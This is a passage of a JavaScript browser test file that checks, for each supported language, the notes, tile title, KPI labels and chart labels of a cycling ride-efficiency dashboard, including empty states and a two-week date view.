  )("gives its note in %s with %s", async (locale, _case, rides, extra, empty, text) => {
    const { page, errors } = await open(
      browser,
      pageFile({ data: withRides([...rides], extra), settings: { languages: [...LANGUAGES] } }),
      { hash: "#cycling", locale },
    );
    expect(await rideNotes(page)).toEqual([text]);
    // an empty state has no tile and no chart
    expect([
      (await page.$$("[data-id=rideEfficiency] .kpi")).length > 0,
      (await rideChart(page)).charts,
    ]).toEqual(empty ? [false, 0] : [true, 1]);
    expect(errors).toEqual([]);
  });

  it.each(Object.entries(RIDE_TEXTS))(
    "names the tile and the chart in %s",
    async (locale, { title, last4, axis, efficiency, rides }) => {
      const { page, errors } = await open(
        browser,
        pageFile({ data: withRides(POWER), settings: { languages: [...LANGUAGES] } }),
        { hash: "#cycling", locale },
      );
      expect(await page.textContent("[data-id=rideEfficiency] h2")).toBe(title);
      expect(Object.keys(await kpiTexts(page, "rideEfficiency"))).toEqual([last4]);
      const { axis: shown, sets } = await rideChart(page);
      expect([shown, ...sets.map((s) => s.label)]).toEqual([axis, efficiency, rides]);
      expect(errors).toEqual([]);
    },
  );

  it.each(Object.entries(RIDE_TEXTS))(
    "names the last week alone on a view of 2 weeks in %s",
    async (locale, { lastWeek }) => {
      // 2 weeks give 1 week at each end
      const { page, errors } = await open(
        browser,
        pageFile({ data: withRides(POWER), settings: { languages: [...LANGUAGES] } }),
        { hash: "#cycling@2026-10-12_2026-10-19", locale },
      );
      expect(Object.keys(await kpiTexts(page, "rideEfficiency"))).toEqual([lastWeek]);
      expect(errors).toEqual([]);
    },
  );
});
